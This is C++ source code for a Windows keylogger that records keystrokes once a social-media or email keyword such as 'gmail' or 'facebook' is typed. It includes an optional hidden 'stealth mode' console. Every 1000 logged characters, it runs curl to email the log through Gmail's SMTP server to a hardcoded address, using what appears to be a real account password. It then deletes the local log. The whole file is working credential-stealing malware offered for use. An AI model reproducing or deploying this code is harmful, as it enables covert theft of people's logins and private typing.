//#define _WIN32_WINNT 0x0500
#include <iostream>
#include <fstream>
#include <windows.h>
#include <vector>
#include <cctype>
#include <string>

using namespace std;

int main()
{
    char c;
    string cword;
    vector<string> list = {"facebook", "gmail", "twitter", "instagram", "snapchat", "tiktok"}; // keywords to start recording 
    bool record = false;

    ofstream outfile;

//    ShowWindow(GetConsoleWindow(), SW_HIDE);          // uncoment this for running in the background (stealh mode)

    while (1)
    {
        Sleep(10);
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                cword += tolower(c);
                if (!record){
                    for (int i=0; i<list.size();i++){
                    if (cword.find(list[i]) != string::npos){
                        outfile.open("log.txt", ios::app);
                        if (outfile.is_open()) {
                            outfile << cword;
                            record  = true;
                            outfile.close();
                            }
                        }
                    }
                }

                if (cword.length() > 30){
                    cword.erase(cword.begin());
                    cword.shrink_to_fit();
                }

                if (record){
                    outfile.open("log.txt", ios::app);
                    if (outfile.is_open()) {
                        outfile << char(c);
                        outfile.close();
                    }

                }

                ifstream rf("log.txt", ifstream::ate | ifstream::binary);
                int sz = rf.tellg();
                rf.close();
                if (sz > 1000){ // for evrey 1000 char recorded a new email will be sent accodding to the email config down bellow
                                // set your send and recive emails here with autentification key 
                    string sCommand = "curl --url smtp://smtp.gmail.com:587 --ssl-reqd --mail-from \"larimouch@gmail.com\" --mail-rcpt \"riadkb.29@gmail.com\"  --upload-file \"log.txt\" --user \"larimouch@gmail.com:faka oucj ztlj sorb\"";
                    LPSTR command = new char[sCommand.size() + 1];
                    copy(sCommand.begin(), sCommand.end(), command);
                    command[sCommand.size()] = '\0';

                    STARTUPINFO info={sizeof(info)};
                    PROCESS_INFORMATION processInfo;
                    if (CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
                    {
                        WaitForSingleObject(processInfo.hProcess, INFINITE);
                        remove("log.txt");
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                    }
                }

            }
        }
    }

    return 0;
}
